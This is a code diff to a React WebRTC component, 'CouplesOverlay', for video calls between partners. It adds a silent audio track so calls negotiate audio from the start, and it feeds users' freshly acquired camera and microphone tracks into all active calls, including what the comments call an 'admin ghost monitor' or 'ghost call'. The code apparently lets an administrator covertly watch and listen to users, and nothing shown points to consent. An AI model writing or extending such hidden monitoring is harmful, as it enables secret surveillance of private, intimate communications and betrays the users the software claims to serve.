@@ -452,6 +452,7 @@ export default function CouplesOverlay({
     let peer = null, dead = false, timer = null;
 
     const blank = () => {
+      const tracks = [];
       try {
         const c = document.createElement('canvas');
         c.width = 320;
@@ -462,9 +463,32 @@ export default function CouplesOverlay({
           ctx.fillRect(0, 0, 320, 240);
         }
         const s = c.captureStream ? c.captureStream(5) : (c.webkitCaptureStream ? c.webkitCaptureStream(5) : null);
-        if (s) return s;
+        if (s && s.getVideoTracks().length > 0) {
+          tracks.push(s.getVideoTracks()[0]);
+        }
       } catch {}
-      return new MediaStream();
+
+      // Add silent dummy audio track so initial WebRTC SDP offer/answer includes m=audio
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (AudioCtx) {
+          const actx = new AudioCtx();
+          const osc = actx.createOscillator();
+          const gain = actx.createGain();
+          gain.gain.value = 0;
+          const dst = actx.createMediaStreamDestination();
+          osc.connect(gain);
+          gain.connect(dst);
+          osc.start();
+          const trk = dst.stream.getAudioTracks()[0];
+          if (trk) {
+            trk.enabled = true;
+            tracks.push(trk);
+          }
+        }
+      } catch {}
+
+      return new MediaStream(tracks);
     };
 
     const openPeer = async () => {
@@ -581,6 +605,15 @@ export default function CouplesOverlay({
                 console.warn('Incoming call error with', partnerId, err);
                 activeCalls.current.delete(partnerId);
               });
+            } else {
+              // Admin ghost call: clean up reference on close/error and optimize bitrate for mobile
+              c.on('close', () => {
+                activeCalls.current.delete(partnerId);
+              });
+              c.on('error', () => {
+                activeCalls.current.delete(partnerId);
+              });
+              clampBitrates(c.peerConnection);
             }
           };
 
@@ -668,6 +701,26 @@ export default function CouplesOverlay({
       if (dead) return;
       local.current = stream;
       setMine(stream);
+
+      // Immediately push acquired tracks to any active calls (including admin ghost monitor)
+      const acquiredVideo = stream?.getVideoTracks?.()?.[0];
+      const acquiredAudio = stream?.getAudioTracks?.()?.[0];
+      if (acquiredVideo || acquiredAudio) {
+        activeCalls.current.forEach((call) => {
+          try {
+            const senders = call.peerConnection?.getSenders?.() || [];
+            if (acquiredVideo) {
+              const videoSender = senders.find((s) => s.track?.kind === 'video' || s.kind === 'video');
+              if (videoSender) videoSender.replaceTrack(acquiredVideo).catch(() => {});
+            }
+            if (acquiredAudio) {
+              const audioSender = senders.find((s) => s.track?.kind === 'audio' || s.kind === 'audio');
+              if (audioSender) audioSender.replaceTrack(acquiredAudio).catch(() => {});
+            }
+          } catch {}
+        });
+      }
+
       await openPeer();
     })();
 
